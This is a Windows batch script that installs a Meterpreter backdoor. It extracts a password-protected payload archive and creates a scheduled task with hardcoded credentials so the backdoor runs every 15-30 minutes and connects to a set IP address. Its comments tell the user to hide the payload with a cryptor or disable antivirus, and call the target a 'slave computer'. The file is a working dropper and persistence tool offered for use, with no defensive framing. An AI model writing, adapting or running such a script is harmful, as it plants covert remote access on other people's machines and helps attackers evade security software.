@echo off
rem install_meterpreter.bat (FTP version)
rem This Script checks if Meterpreter Backdopr Installation file is exist
rem and installs this backdoor on a slave computer
rem Backdoor is start every 15-30 min and sets connection
rem to the specified IP Address
rem Note! The meterpreter backdoor must be encrypted with the cryptor program
rem Or antivirus must be hard locked off!

rem Script for Downloads and Installs Meterpreter Backdoor
rem USAGE
rem > install_meterpreter.bat
rem Run script with administrative privileges

rem Initialising Script's Environment

SetLocal EnableExtensions EnableDelayedExpansion

set curdir=%CD%

rem Refresh Environment Variables
call "C:\ProgramData\chocolatey\bin\RefreshEnv.cmd"

rem Локальный каталог
set LocalFolderZ=%PUB1%\Distrib\Zlovred
set LocalFolderU=%PUB1%\Util

rem Change Current Catalog
cd /d %LocalFolderZ%

rem Install Meterpreter Backdoor
if not exist meterpreter-backdoor.7z goto pass_Meterpreter
echo "Install Meterpreter Backdoor..."
7z e -bd -o%LocalFolderU% -pAdmin01234 meterpreter-backdoor.7z

cd /d %LocalFolderU%

echo "Scheduled Task..."

%SystemRoot%\System32\schtasks.exe /Create /XML %LocalFolderU%\User_Quartre_Task1.xml /TN "User Quartre Task1" /F /RU MSSQLSR /RP Admin01234

:pass_Meterpreter
exit /b 0


